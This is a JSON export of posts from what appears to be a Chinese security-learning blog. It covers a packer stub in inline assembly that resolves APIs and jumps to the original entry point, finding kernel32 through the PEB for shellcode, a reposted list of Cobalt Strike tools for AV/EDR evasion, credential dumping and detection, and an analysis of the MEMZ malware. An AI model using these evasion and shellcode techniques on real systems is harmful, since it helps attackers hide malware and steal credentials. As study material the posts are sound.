ptr[esi + 8], 065726464h; jne _LOOP; cmp word ptr[esi + 0ch], 07373h; jne _LOOP; mov edi, [ebx + 024h]; add edi, eax; mov di, [edi + edx * 2]; and edi, 0FFFFh; mov edx, [ebx + 01ch]; add edx, eax; mov edi, [edx + edi * 4]; add edi, eax; ; mov MyGetProcAddress, edi; jmp _ENDWHILE; _LOOP:; inc edx; // ++index; jmp _WHILE; _ENDWHILE:; popad; } MyLoadLibraryA = (FnLoadLibraryA)MyGetProcAddress(hKernel32, &quot;LoadLibrary&quot;); MyVirtualProtect = (FnVirtualProtect)MyGetProcAddress(hKernel32, &quot;VirtualProtect&quot;); } extern &quot;C&quot; __declspec(dllexport) __declspec(naked) void Start() { //获取函数的API地址 //GetApis(); //跳转到原始OEP __asm { mov eax, g_conf.srcOep; //mov eax, 0x15490 add eax, 0x400000 jmp eax } } 有bug，但是不想弄了，先放着 ","link":"https://tickertapetimer.github.io/post/壳的自我修养/"},{"title":"利用PEB寻找kernel32.dll的基地址","content":"前言 最近在尝试入门免杀，于是打算开始学习一手shellcode编写，而想要运行shellcode，就必须要明白shellcode的实现原理。 shellcode shellcode是一段独立于正常代码的数据，甚至可以把它放进数组里，然后去call它，这个特点既提高了它的灵活性，也加大了编写的难度。 因为shellcode只是一段二进制数据，所以它没有调用DLL获取api的简单操作，想要让shellcode在运行时可以使用kernel32.dll里面的api，我们就需要使用PEB，在说PEB前，我们需要先明白TEB TEB TEB对应的全称是Thread Environment Block ，直译过来是线程环绕块。 TEB结构体存储了线程相关的一些关键信息。 在介绍TEB之前，先简单介绍一下进程和线程的概念。 简单来说，进程可以理解为一个程序，比如启动微信，启动cmd.exe都是启动了一个进程。 线程在进程内部，可以理解为真正干活的东西。一个进程至少要完成一个任务，所以一个进程至少有一个线程。当然一个进程可以有很多个线程，这些线程可以是顺序执行的，也可以是并发执行的（多线程） 线程是程序执行的最小单元。 系统会在TEB中保存线程的一些相关数据。TEB位于用户地址空间，比PEB所在地址低。 进程中的每一个线程都有属于自己的一个TEB，进程中的所有TEB都以堆栈的方式存放在0x7FFDE000开始的线性内存中，每个TEB的大小为4kb。 所以在用户模式下，当前线程的TEB拥有4kb的空间，可以通过CPU的FS寄存器来访问该段。 TEB的起始地址一般是FS:[0] 在windbg中可以使用$thread取得TEB的地址。 PEB PEB全称是Process Environment Block 进程环境块。 通过上面的介绍已经说了每个线程都有自己的TEB，其实每个进程也有自己的PEB信息。 PEB也存放在用户态的地址空间。 在以前的操作系统中，PEB的默认地址在0x7FFDF000处。 PEB的地址计算有两种： 1 通过EPROCESS偏移0x1b0得到，但是EPROCESS是系统地址空间，访问EPROCESS需要R0的权限 2 通过TEB结构偏移0x30获取PEB 之前已经讲过，通过FS:[0] 可以获取到当前TEB 的起始地址 所以通过fs:[0x30] 就可以获取到PEB的地址 ","link":"https://tickertapetimer.github.io/post/利用PEB寻找kernel32.dll的基地址/"},{"title":"免杀转载","content":"文章来源 https://github.com/zer0yu/Awesome-CobaltStrike 本转载只为方便自己查看，无任何其他用途 Contents 0x00 Introduction 0x01 Articles &amp; Videos 1. Basic Knowledge 2. Crack and Customisation 3. Useful Trick 4. CobaltStrike Hide 5. CobaltStrike Analysis 6. CobaltStrike Video 0x02 C2 Profiles 0x03 BOF 0x04 Aggressor Script 0x05 Related Tools 0x06 Related Resources 0x00 Introduction The first part is a collection of quality articles about CobaltStrike The third part is about the integration of the new features BOF resources This project is to solve the problem of not finding the right aggressor script or BOF when it is needed If there is quality content that is not covered in this repo, welcome to submit pr 0x01 Articles &amp; Videos 1. Basic Knowledge Cobalt_Strike_wiki Cobalt Strike Book CobaltStrike4.0笔记 CobaltStrike相关网络文章集合 Cobalt Strike 外部 C2 之原理篇 Cobalt Strike 桌面控制问题的解决（以及屏幕截图等后渗透工具） Cobalt Strike &amp; MetaSploit 联动 Cobalt-Strike-CheatSheet Cobalt Strike MITRE TTPs 2. Crack and Customisation IntelliJ-IDEA修改cobaltstrike CobaltStrike二次开发环境准备 Cobal Strike 自定义OneLiner 通过反射DLL注入来构建后渗透模块（第一课） Cobalt Strike Aggressor Script （第一课） Cobalt Strike Aggressor Script （第二课） Implementing Syscalls In The Cobaltstrike Artifact Kit Cobalt Strike 4.0 认证及修补过程 使用ReflectiveDLLInjection武装你的CobaltStrike Bypass cobaltstrike beacon config scan Tailoring Cobalt Strike on Target COFFLOADER: BUILDING YOUR OWN IN MEMORY LOADER OR HOW TO RUN BOFS Yet Another Cobalt Strike Stager: GUID Edition 3. Useful Trick Cobalt Strike Spear Phish run CS in win -- teamserver.bat Remote NTLM relaying through CS -- related to CVE_2018_8581 Cobalt Strike Convet VPN 渗透神器CS3.14搭建使用及流量分析 CobaltStrike生成免杀shellcode CS-notes--一系列CS的使用技巧笔记 使用 Cobalt Strike 对 Linux 主机进行后渗透 Cobalt Strike Listener with Proxy Cobalt Strike Convet VPN CS 4.0 SMB Beacon Cobalt Strike 浏览器跳板攻击 Cobalt Strike 中 Bypass UAC 一起探索Cobalt Strike的ExternalC2框架 深入探索Cobalt Strike的ExternalC2框架 Cobalt Strike的特殊功能（external_C2）探究 A tale of .NET assemblies, cobalt strike size constraints, and reflection AppDomain.AssemblyResolve 从webshell建立代理上线不出网的内网机器 在Cobalt Strike BOF中进行直接系统调用 Using Direct Syscalls in Cobalt Strike's Artifact Kit Cobalt Strike Staging and Extracting Configuration Information 4. CobaltStrike Hide CobaltStrike证书修改躲避流量审查 CS 合法证书 + Powershell 上线 Cobalt Strike 团队服务器隐匿 红队基础建设:隐藏你的C2 server Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite 深入研究cobalt strike malleable C2配置文件 A Brave New World: Malleable C2 How to Write Malleable C2 Profiles for Cobalt Strike Randomized Malleable C2 Profiles Made Easy 关于CobaltStrike的Stager被扫问题 Beacon Stager listener 去特征 检测与隐藏Cobaltstrike服务器 记一次cs bypass卡巴斯基内存查杀 Cobalt Strike – Bypassing C2 Network Detections 5. CobaltStrike Analysis Volatility Plugin for Detecting Cobalt Strike Beacon. blog|Toolset 逆向分析Cobalt Strike安装后门 分析cobaltstrike c2 协议 Small tool to decrypt a Cobalt Strike auth file Cobalt Strike 的 ExternalC2 Detecting Cobalt Strike Default Modules via Named Pipe Analysis 浅析CobaltStrike Beacon Staging Server扫描 Striking Back at Retired Cobalt Strike: A look at a legacy vulnerability Analyzing Cobalt Strike for Fun and Profit Cobalt Strike Remote Threads detection The art and science of detecting Cobalt Strike A Multi-Method Approach to Identifying Rogue Cobalt Strike Servers How to detect Cobalt Strike activities in memory forensics Detecting Cobalt Strike by Fingerprinting Imageload Events The Anatomy of an APT Attack and CobaltStrike Beacon’s Encoded Configuration CobaltStrike - beacon.dll : Your No Ordinary MZ Header GitHub-hosted malware calculates Cobalt Strike payload from Imgur pic Detecting Cobalt Strike beacons in NetFlow data Volatility Plugin for Detecting Cobalt Strike Beacon Easily Identify Malicious Servers on the Internet with JARM Cobalt Strike Beacon Analysis Hancitor infection with Pony, Evil Pony, Ursnif, and Cobalt Strike Attackers Exploiting WebLogic Servers via CVE-2020-14882 to install Cobalt Strike Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs Identifying Cobalt Strike team servers in the wild Multi-stage APT attack drops Cobalt Strike using Malleable C2 feature Operation Cobalt Kitty Detecting and Advancing In-Memory .NET Tradecraft Analysing Fileless Malware: Cobalt Strike Beacon IndigoDrop spreads via military-themed lures to deliver Cobalt Strike Cobalt Group Returns To Kazakhstan Striking Back at Retired Cobalt Strike: A look at a legacy vulnerability Azure Sentinel Quick-Deploy with Cyb3rWard0g’s Sentinel To-Go – Let’s Catch Cobalt Strike! Cobalt Strike stagers used by FIN6 Malleable C2 Profiles and You C2 Traffic patterns including Cobalt Strike Cobalt Strike DNS Direct Egress Not That Far Away Detecting Exposed Cobalt Strike DNS Redirectors Example of Cleartext Cobalt Strike Traffic Cobaltstrike-Beacons analyzed 通过DNS协议探测Cobalt Strike服务器 Detecting Cobalt Strike with memory signatures 6. CobaltStrike Video Malleable Memory Indicators with Cobalt Strike's Beacon Payload STAR Webcast: Spooky RYUKy: The Return of UNC1878 Excel 4.0 Macros Analysis - Cobalt Strike Shellcode Injection Profiling And Detecting All Things SSL With JA3 0x02 C2 Profiles Type Name Description Popularity Language ALL Malleable-C2-Profiles Official Malleable C2 Profiles ALL Malleable-C2-Randomizer This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage ALL malleable-c2 Cobalt Strike Malleable C2 Design and Reference Guide ALL C2concealer C2concealer is a command line tool that generates randomized C2 malleable profiles for use in Cobalt Strike. ALL MalleableC2-Profiles A collection of Cobalt Strike Malleable C2 profiles. now have Windows Updates Profile ALL pyMalleableC2 A Python interpreter for Cobalt Strike Malleable C2 profiles that allows you to parse, modify, build them programmatically and validate syntax. 0x03 BOF Type Name Description Popularity Language ALL BOF_Collection Various Cobalt Strike BOFs ALL Situational Awareness BOF Its larger goal is providing a code example and workflow for others to begin making more BOF files. Blog ALL bof_helper Beacon Object File (BOF) Creation Helper ALL BOF-DLL-Inject BOF DLL Inject is a custom Beacon Object File that uses manual map DLL injection in order to migrate a dll into a process all from memory. ALL cobaltstrike_bofs BOF spawns a process of your choice under a specified parent, and injects a provided shellcode file via QueueUserAPC(). ALL BOF-RegSave Beacon Object File(BOF) for CobaltStrike that will acquire the necessary privileges and dump SAM - SYSTEM - SECURITY registry keys for offline parsing and hash extraction. ALL CobaltStrike BOF DCOM Lateral Movement; WMI Lateral Movement - Win32_Process Create; WMI Lateral Movement - Event Subscription ALL BOFs ETW Patching; API Function Utility; Syscalls Shellcode Injection Dev bof This is a template project for building Cobalt Strike BOFs in Visual Studio. Dev BOF.NET A .NET Runtime for Cobalt Strike's Beacon Object Files. Dev beacon-object-file The format, described by Mudge here, asks that the operator construct an COFF file using a mingw-w64 compiler or the msvc compiler that holds an symbol name indicating its entrypoint, and underlying function calls. Dev InlineWhispers Demonstrate the ability to easily use syscalls using inline assembly in BOFs. Dev WdToggle A Proof of Concept Cobalt Strike Beacon Object File which uses direct system calls to enable WDigest credential caching and circumvent Credential Guard (if enabled). Dev Situational Awareness BOF This Repo intends to serve two purposes. First it provides a nice set of basic situational awareness commands implemented in BOF. This allows you to perform some checks on a host before you begin executing commands that may be more invasive. Dev MiniDumpWriteDump Custom implementation of DbgHelp's MiniDumpWriteDump function. Uses static syscalls to replace low-level functions like NtReadVirtualMemory. Dev COFF Loader This is a quick and dirty COFF loader (AKA Beacon Object Files). Currently can run un-modified BOF's so it can be used for testing without a CS agent running it. The only exception is that the injection related beacon compatibility functions are just empty. Auxiliary EnumCLR.c Cobalt Strike BOF to identify processes with the CLR loaded with a goal of identifying SpawnTo / injection candidates. Auxiliary FindObjects-BOF A Cobalt Strike Beacon Object File (BOF) project which uses direct system calls to enumerate processes for specific modules or process handles. Auxiliary ChromeKeyDump BOF implementation of Chlonium tool to dump Chrome Masterkey and download Cookie/Login Data files Auxiliary Sleeper BOF to call the SetThreadExecutionState function to prevent host from Sleeping Auxiliary LSASS Beacon Object File to dump Lsass memory by obtaining a snapshot handle. Does MiniDumpWriteDump/NtReadVirtualMemory on SnapShot of LSASS instad of original LSASS itself hence evades some AV/EDR. Auxiliary getsystem get system by duplicating winlogon's token. Auxiliary Silent Lsass Dump Silent Lsass Dump Auxiliary CredBandit CredBandit is a proof of concept Beacon Object File (BOF) that uses static x64 syscalls to perform a complete in memory dump of a process and send that back through your already existing Beacon communication channel. The memory dump is done by using NTFS transactions which allows us to write the dump to memory and the MiniDumpWriteDump API has been replaced with an adaptation of ReactOS's implementation of MiniDumpWriteDump. Exploit CVE-2020-0796-BOF SMBGhost LPE Exploit ZeroLogon-BOF ZeroLogon 0x04 Aggressor Script Type Name Description Popularity Language BypassAV BypassAV 用于快速生成免杀的可执行文件 BypassAV scrun BypassAV ShellCode Loader (Cobaltstrike/Metasploit) Useage BypassAV beacon-c2-go beacon-c2-go (Cobaltstrike/Metasploit) BypassAV C--Shellcode python ShellCode Loader (Cobaltstrike&amp;Metasploit) Useage BypassAV Doge-Loader Cobalt Strike Shellcode Loader by Golang BypassAV CS-Loader CS免杀,包括python版和C版本的 BypassAV CSSG Cobalt Strike Shellcode Generator. Generates beacon stageless shellcode with exposed exit method, additional formatting, encryption, encoding, compression, multiline output, etc BypassAV Alaris Alaris is a new and sneaky shellcode loader capable of bypassing most EDR systems as of today (02/28/2021). It uses several known TTP’s that help protect the malware and it’s execution flow. BypassAV CarbonMonoxide EDR Evasion - Combination of SwampThing - TikiTorch BypassAV bypassAV-1 条件触发式远控 VT 6/70 免杀国内杀软及defender、卡巴斯基等主流杀软. BypassAV ScareCrow ScareCrow is a payload creation framework for generating loaders for the use of side loading (not injection) into a legitimate Windows process (bypassing Application Whitelisting controls). BypassAV Dent A framework for creating COM-based bypasses utilizing vulnerabilities in Microsoft's WDAPT sensors. BypassAV PEzor Open-Source PE Packer. BypassUAC UAC-SilentClean This project implements a DLL planting technique to bypass UAC Always Notify and execute code in a high integrity process. BypassUAC csload.net A cobaltStrike Shellcode loader, can bypass most of AV Recon red-team-scripts perform some rudimentary Windows host enumeration with Beacon built-in commands Recon aggressor-powerview All functions listed in the PowerView about page are included in this with all arguments for each function. PowerView Recon PowerView3-Aggressor PowerView Aggressor Script for CobaltStrike PowerView Recon AggressorScripts Sharphound-Aggressor- A user menu for the SharpHound ingestor Recon ServerScan 内网横向信息收集的高并发网络扫描、服务探测工具。 Recon TailorScan 端口扫描+探测网卡+ms17010探测 Recon AggressiveProxy LetMeOutSharp will try to enumerate all available proxy configurations and try to communicate with the Cobalt Strike server over HTTP(s) using the identified proxy configurations. Recon Spray-AD A Cobalt Strike tool to audit Active Directory user accounts for weak, well known or easy guessable passwords. Exploit XSS-Fishing2-CS 鱼儿在cs上线后自动收杆 / Automatically stop fishing in javascript after the fish is hooked Exploit XSS-Phishing xss钓鱼，cna插件配合php后端收杆 Exploit custom_payload_generator CobaltStrike3.0+ --&gt; creates various payloads for Cobalt Strike's Beacon. Current payload formats Exploit CrossC2 CrossC2 framework - Generator CobaltStrike's cross-platform beacon Exploit GECC Go External C2 Client implementation for cobalt strike. Exploit Cobaltstrike-MS17-010 ms17-010 exploit tool and scanner. Exploit AES-PowerShellCode Standalone version of my AES Powershell payload for Cobalt Strike. Exploit SweetPotato_CS CobaltStrike4.x --&gt; SweetPotato Exploit ElevateKit privilege escalation exploits Exploit CVE-2018-4878 CVE-2018-4878 Exploit Aggressor-Scripts The only current public is UACBypass, whose readme can be found inside its associated folder. Exploit CVE_2020_0796_CNA 基于ReflectiveDLLInjection实现的本地提权漏洞 Exploit DDEAutoCS setup our stage(d) Web Delivery attack Exploit geacon Implement CobaltStrike's Beacon in Go (can be used in Linux) Exploit SpoolSystem SpoolSystem is a CNA script for Cobalt Strike which uses the Print Spooler named pipe impersonation trick to gain SYSTEM privileges. Persistence persistence-aggressor-script persistence-aggressor-script Persistence Peinject_dll 弃用winexec函数，使用shellexecute函数，程序流不在卡顿，达到真正的无感。 Persistence TikiTorch TikiTorch follows the same concept(CACTUSTORCH) but has multiple types of process injection available, which can be specified by the user at compile time. Persistence CACTUSTORCH A JavaScript and VBScript shellcode launcher. This will spawn a 32 bit version of the binary specified and inject shellcode into it. Persistence UploadAndRunFrp 上传frpc并且运行frpc Persistence persistence-aggressor-script Persistence Aggressor Script Persistence AggressiveGadgetToJScript Automate the generation of payloads using the GadgetToJScript technique. Persistence FrpProPlugin frp0.33修改版,过流量检测,免杀,支持加载远程配置文件可用于cs直接使用的插件 Persistence cobalt-strike-persistence 使用者通过cobalt strike生成Web Delivery类型的payload，然后加载此脚本可以到达自启动效果 Auxiliary generate-rotating-beacon 1. Generate a beacon for a given listener; 2. Host the file at a specified location;3. Monitor the weblog for fetching of the specified location; Auxiliary AggressorScripts CreateTicket; Seatbelt; SharpHound Auxiliary Cobaltstrike-atexec 利用任务计划进行横向，需要与135端口、445端口进行通信 Auxiliary Sharp-HackBrowserData C#的HackBrowserData工具，方便在cs中直接内存加载 Auxiliary HackBrowserData HackBrowserData的反射模块 Auxiliary SharpeningCobaltStrike In realtime compiling of dotnet v35/v40 exe/dll binaries + obfuscation with ConfuserEx on your linux cobalt strike server. Auxiliary SharpCompile SharpCompile is an aggressor script for Cobalt Strike which allows you to compile and execute C## in realtime. Auxiliary Quickrundown Utilizing QRD will allow an operator to quickly characterize what processes are both known and unknown on a host through the use of colors and notes about the processes displayed. Auxiliary Phant0m_cobaltstrike This script walks thread stacks of Event Log Service process (spesific svchost.exe) and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running. Auxiliary NoPowerShell NoPowerShell is a tool implemented in C## which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms. Auxiliary EventLogMaster RDP EventLog Master Auxiliary ANGRYPUPPY Bloodhound Attack Path Execution for Cobalt Strike Auxiliary CobaltStrike_Script_Wechat_Push 上线微信提醒的插件,通过微信Server酱提醒 Auxiliary CS-Aggressor-Scripts slack and webhooks reminder Auxiliary Aggressor-Scripts surveying of powershell on targets (在对应的目标上检测powershell的相关信息) Auxiliary cs-magik Implements an events channel and job queue using Redis for Cobalt Strike. Auxiliary AggressorScripts 查看进程的时候讲av进程标注为红色 Auxiliary Raven CobaltStrike External C2 for Websockets Auxiliary CobaltStrikeParser Python parser for CobaltStrike Beacon's configuration Auxiliary fakelogonscreen FakeLogonScreen is a utility to fake the Windows logon screen in order to obtain the user's password. Auxiliary SyncDog Make bloodhound sync with cobaltstrike. Auxiliary 360SafeBrowsergetpass 一键辅助抓取360安全浏览器密码的CobaltStrike脚本，通过下载浏览器数据库、记录密钥来离线解密浏览器密码。 Auxiliary SharpDecryptPwd 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。 Auxiliary List-GitHubAssembly Fetch a list of avaialble artifacts from the configured GitHub repo. Auxiliary ExecuteAssembly ExecuteAssembly is an alternative of CS execute-assembly, built with C/C++ and it can be used to Load/Inject .NET assemblies by; reusing the host (spawnto) process loaded CLR Modules/AppDomainManager, Stomping Loader/.NET assembly PE DOS headers, Unlinking .NET related modules, bypassing ETW+AMSI, avoiding EDR hooks via NT static syscalls (x64) and hiding imports by dynamically resolving APIs via superfasthash hashing algorithm. Auxiliary aggrokatz aggrokatz is an Aggressor plugin extension for CobaltStrike which enables pypykatz to interface with the beacons remotely. Synthesis Erebus CobaltStrike4.x --&gt; Erebus CobaltStrike后渗透测试插件 Synthesis Cobalt-Strike-Aggressor-Scripts CobaltStrike后渗透测试插件集合 Usage Synthesis AggressorScripts Aggressor scripts for use with Cobalt Strike 3.0+ Synthesis RedTeamTools RedTeamTools for use with Cobalt Strike Synthesis cobalt-arsenal Aggressor Scripts for Cobalt Strike 4.0+ Synthesis MoveKit The aggressor script handles payload creation by reading the template files for a specific execution type. intro Synthesis StayKit The aggressor script handles payload creation by reading the template files for a specific execution type. intro Synthesis AggressorScripts AggressorScripts Synthesis AggressorScripts Collection of Aggressor scripts for Cobalt Strike 3.0+ pulled from multiple sources Synthesis AggressorScripts AggressorScripts Synthesis Aggressor-VYSEC Contains a bunch of CobaltStrike Aggressor Scripts Synthesis AggressorAssessor AggressorAssessor Synthesis AggressorAssessor AggressorAssessor Synthesis aggressor-scripts Collection of Cobalt Strike Aggressor Scripts Synthesis Aggressor-scripts This is just a random collection of Aggressor Scripts I've written for Cobalt Strike 3.x. (其中有一个debug脚本比较好用) Synthesis Aggressor-Script Collection of Aggressor Scripts for Cobalt Strike(主要包含了提权和权限维持脚本) Synthesis Aggressor-Script Aggressor Script, Kit, Malleable C2 Profiles, External C2 and so on Synthesis aggressor_scripts_collection Collection of various aggressor scripts for Cobalt Strike from awesome people. Will be sure to update this repo with credit to each person. Synthesis CobaltStrike-ToolKit googlesearch.profile and script related to AD. Synthesis Arsenal Cobalt Strike 3.13 Arsenal Kit Synthesis cobalt-arsenal My collection of battle-tested Aggressor Scripts for Cobalt Strike 4.0+ Synthesis aggressor_scripts A collection of useful scripts for Cobalt Strike.(powershell.cna;bot.cna;dcom_lateral_movement.cna;ElevateKit) Synthesis aggressor creating tunnels with netsh; changed default to bit.ly redirect to mcdonalds;using powershell to kill parent process; Synthesis CobaltStrikeCNA A collection of scripts - from various sources - see script for more info. Synthesis AggressorScripts Highlights selected processes from the ps command in beacon;Loads various aliases into beacon;sets a few defaults for scripts to be used later.. Synthesis AggressorAssessor 从C2生成到横向移动的全辅助脚本套件 Synthesis AggressorCollection Collection of awesome Cobalt Strike Aggressor Scripts. All credit due to the authors Synthesis Cobaltstrike-Aggressor-Scripts-Collection The collection of tested cobaltstrike aggressor scripts. Synthesis aggressorScripts CobaltStrike AggressorScripts for the lazy Synthesis cobalt_strike_extension_kit 集成了SharpHound,SharpRDP,SharpWMI等在内的各种内网工具，使用AggressorScripts构建workflow Synthesis cobaltstrike 具备域管理员定位、域信息收集、权限维持、内网扫描、数据库hash dump、Everything内网搜索文件等功能的插件集合 Synthesis 365CobaltStrike 兼容CobaltStrike4.0的插件集合 Synthesis CSPlugins 一个对Cobaltstrike第三方插件进行收集的项目，持续更新。 Synthesis CobaltStrike-xor third-party --&gt; vnc_x86_dll and vnc_x64_dll Synthesis Z1-AggressorScripts 适用于Cobalt Strike 3.x &amp; 4.x 的内网渗透插件集合 Synthesis csplugin 导入PowerView脚本，和常见的功能使用 Synthesis CSplugins 涉及工作目录、信息收集、凭据获取、权限维持、权限提升、用户相关、RDP相关、防火墙相关、域渗透、powershell相关、内网穿透、内网探测、远程文件下载、痕迹清除的综合型插件系统 0x05 Related Tools Type Name Description Popularity Language AntiCobaltStrike cobaltstrike_brute Cobalt Strike Team Server Password Brute Forcer AntiCobaltStrike CobaltStrikeScan Scan files or process memory for Cobalt Strike beacons and parse their configuration. AntiCobaltStrike grab_beacon_config Simple PoC script to scan and acquire CobaltStrike Beacon configurations. AntiCobaltStrike C2-JARM 通过ssl实现所产生的JARM hash来识别不同的c2，例如CobaltStrike AntiCobaltStrike JARM JARM fingerprints scanner AntiCobaltStrike DetectCobaltStomp A quick(and perhaps dirty!) PoC tool to detect Module Stomping as implemented by Cobalt Strike with moderate to high confidence AntiCobaltStrike cobaltstrike Code and yara rules to detect and analyze Cobalt Strike AntiCobaltStrike CS_Decrypt 解密可以帮助你理解cs beacon通信原理，但注意密钥是在本地teamserver中 AntiCobaltStrike CS Scripts parse_beacon_keys.py 对 .cobaltstrike.beacon_keys 文件的解析工具 AntiCobaltStrike PyBeacon A collection of scripts for dealing with Cobalt Strike beacons in Python Resources AntiCobaltStrike cobaltstrikescan Detecting CobaltStrike for Volatility AntiCobaltStrike CobaltStrikeForensic Toolset for research malware and Cobalt Strike beacons AntiCobaltStrike DuckMemoryScan A simple tool to find backdoors including but not limited to iis hijacking, fileless Trojan, bypass AV shellcode. AntiCobaltStrike CobaltSplunk Splunk Application CobaltSplunk is a Splunk Application that knows how to 1) ingest Cobalt Strike related logs and parse them properly, 2) display useful operational dashboards, 3) display relevant reports. AntiCobaltStrike BeaconHunter Behavior based monitoring and hunting tool built in C## tool leveraging ETW tracing. Blue teamers can use this tool to detect and respond to potential Cobalt Strike beacons. Red teamers can use this tool to research ETW bypasses and discover new processes that behave like beacons. Analysis Beacon Open Source Cobalt Strike Beacon. Unreleased, in research stages BypassAV Cooolis-ms Cooolis-ms是一个包含了Metasploit Payload Loader、Cobalt Strike External C2 Loader、Reflective DLL injection的代码执行工具，它的定位在于能够在静态查杀上规避一些我们将要执行且含有特征的代码，帮助红队人员更方便快捷的从Web容器环境切换到C2环境进一步进行工作。 BypassAV UrbanBishopLocal A port of FuzzySecurity's UrbanBishop project for inline shellcode execution. BypassAV SecondaryDevCobaltStrike CobaltStrike after second development, can bypass Kaspersky, Norton, McAfee, etc. BypassAV CrossNet-Beta In the red team operation, the phishing executable file is generated by using the white utilization, to bypass AV and automatically judging the network environment. can bypass 360 and huorong Auxiliary C2ReverseProxy When you encounter a non-networked environment during penetration, you can use this tool to establish a reverse proxy channel so that the beacons generated by CobaltStrike can bounce back to the CobaltStrike server. Auxiliary CobaltPatch Cobalt Strike Malleable Profile Inline Patch Template: A Position Independent Code (PIC) Code Template For Creating Shellcode That Can Be Appended In Stage / Post-Ex Blocks. Made for C Programmers Auxiliary pycobalt Cobalt Strike Malleable Profile Inline Patch Template: A Position Independent Code (PIC) Code Template For Creating Shellcode That Can Be Appended In Stage / Post-Ex Blocks. Made for C Programmers. Auxiliary redshell An interactive command prompt that executes commands through proxychains and automatically logs them on a Cobalt Strike team server. Auxiliary CobaltStrikeToGhostWriter Log converter from CS logs to a CSV in Ghostwriter's operation log format. Auxiliary Ansible-Cobalt-Strike An Ansible role to install cobalt-strike on debian based architectures, let's be honest it's for kali. Auxiliary cobaltstrike_runtimeconfig A POC showing how to modify Cobalt Strike beacon at runtime Auxiliary pystinger Pystinger implements SOCK4 proxy and port mapping through webshell. It can be directly used by cobalt strike for session online. Auxiliary ansible-role-cobalt-strike An Ansible role for installing Cobalt Strike. Auxiliary CrossNet In the red team operation, the phishing executable file is generated by using the white utilization, avoiding killing and automatically judging the network environment. Auxiliary BypassAddUser Bypass AV to add users Synthesis redi Automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt) Synthesis cs2modrewrite Automatically Generate Rulesets for Apache mod_rewrite or Nginx for Intelligent HTTP C2 Redirection Synthesis RedWarden Flexible CobaltStrike Malleable Redirector Synthesis Apache Mod_Rewrite Terrafrom Automation Bash scripts that take variables from the user and then call terraform scripts to automate standing up apache2 with mod_rewrite in front of C2 servers. Right now, this repo supports standing up redirectors in Linode or Digital Ocean, and I have different scripts for standing up http redirectors versus https redirectors. Since the mod_rewrite redirector setup scripts use a user agent value and optionally a bearer token, these redirectors are not C2 dependent and can work for any C2 that uses http or https. Synthesis Red-EC2 Deploy RedTeam Specific EC2 via ansible. Synthesis Rapid Attack Infrastructure Red Team Infrastructure... Quick... Fast... Simplified. Synthesis RedCommander Creates two Cobalt Strike C2 servers (DNS and HTTPS), with redirectors, and RedELK in Amazon AWS. Minimal setup required! Companion Blog here Synthesis CobaltPatch Cobalt Strike Malleable Profile Inline Patch Template: A Position Independent Code (PIC) Code Template For Creating Shellcode That Can Be Appended In Stage / Post-Ex Blocks. Made for C Programmers Synthesis CPLResourceRunner Run shellcode(Cobalt Strike) from resource Dev vscode-language-aggressor This is a Visual Studio Code (VSC) extension that aims to provide: An implement of the Sleep and Cobalt Strike (CS) Aggressor grammar; and The definition of Cobalt Strike functions' prototype 0x06 Related Resources Type Name Description Popularity DATA SilasCutler JARM Scan CobaltStrike Beacon Config.json SilasCutler JARM Scan CobaltStrike Beacon Config DATA Cobalt Strike hashes This page shows some basic information the Yara rule CobaltStrike including corresponding malware samples. DATA List of Cobalt Strike servers List of Cobalt Strike servers DATA CobaltStrike samples pass=infected CobaltStrike samples DATA List of spawns from exposed Cobalt Strike C2 List of spawns from exposed Cobalt Strike C2 DATA C2IntelFeeds Automatically created C2 Feeds based of Censys YARA apt_cobaltstrike Cobalt Strike Yara YARA apt_cobaltstrike_evasive Cobalt Strike Yara YARA rules Cobalt Strike Yara Rules suricata-rules Suricata IDS rules used to detect the red team penetration/malicious behavior, support testing CobaltStrike/MSF/Empire/DNS tunnels/Weevely scorpion/mining/rebound/kitchen/ice shell/ICMP tunnel, etc ","link":"https://tickertapetimer.github.io/post/免杀转载/"},{"title":"彩虹猫病毒分析","content":"参考文章：[原创]最适合新手的病毒分析——彩虹猫病毒 初步观察 先拍个快照，再运行病毒程序，观察发生了什么 发现运行后存在以下现象： 会弹出浏览器窗口 鼠标开始不规律的闪动 有大量三角形感叹号，圆圈状叉号图标出现 电脑反色，怀疑是对比度的问题 最后在任务管理器发现了6个MEMZ.exe的进程，任意关闭一个，虚拟机直接卡死，关机重启失败，开机界面为一串大意为电脑已被攻击的英文，然后出现彩虹猫GIF 初步分析 在百度以及查阅参考文章后，得到相关现象对应的函数： 会弹出浏览器窗口 —— ShellExecute 鼠标开始不规律的闪动 —— SetCursorPos、GetCursorPos 有大量三角形感叹号，圆圈状叉号图标出现 —— DrawIcon 电脑反色，怀疑是对比度的问题 —— BitBlt、StretchBlt 6个MEMZ进程 —— ShellExecute 由于没有连接声音所以没发现的系统提示音现象 —— PlaySoundA 这些函数都可以在StudyPE+中查看导入表时发现 IDA 再进一步，打开IDA分析 一开始就调用了GetCommandLineW()以及CommandLineToArgvW()，这两个函数的作用分别是获取命令行参数，解析命令行参数 但我们运行它的时候是不存在参数的，所以 pNumArgs &gt; 1可以不看，直接往后看 无参数部分 这里有弹窗，而在我们运行程序时，也会弹出两个一模一样的弹窗，合理推断这里才是程序入口点 进入入口点后，就可以看到前面说的生成6个MEMZ进程的函数了 利用do-while循环，以&quot;/watchdog&quot;为参数创建5个MEMZ进程，再用&quot;/main&quot;参数创建一个MEMZ进程 以main参数创建进程的代码中，还有一个函数 SetPriorityClass()，这个函数是一个给进程设置优先级的函数，目测应该属于提权操作，而该函数的参数0x80，意味着该&quot;/main&quot;进程的优先级被设至最高（应该是） 创建完线程后调用 ExitProcess退出进程 /watchdog参数 在添加参数创建的进程中，根据参数的不同，也可以分为两部分代码，即&quot;/watchdog&quot;和&quot;/main&quot;两个参数 这段代码有熟悉的 CreateThread创建线程函数，还有 RegisterClassExA函数，作用为注册一个窗口类，供以后在对CreateWindow或CreateWindowEx函数的调用中使用、CreateWindowExA函数，用于创建窗口 在CreateWindowExA函数下面的while循环，可以看到有三个与message相关的函数，一个是检索消息，另外两个是调度或发布消息，可以推断这是一个消息循环，作用未知 